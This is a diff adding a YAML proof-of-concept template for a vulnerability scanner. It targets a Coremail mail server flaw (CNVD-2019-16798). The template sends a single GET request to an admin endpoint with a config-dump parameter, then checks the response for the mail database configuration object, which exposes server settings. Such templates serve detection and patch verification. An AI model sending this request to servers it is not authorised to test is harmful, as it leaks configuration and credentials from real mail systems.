@@ -1,0 +1,22 @@
+id: poc-yaml-coremail-cnvd-2019-16798
+info:
+  name: Coremail (CNVD-2019-16798)
+  severity: high
+  tags:
+  - cnvd-2019-16798
+  - CNVD-2019-16798
+  finger: Coremail
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<object name=\"cm_md_db\">")
+  output: []
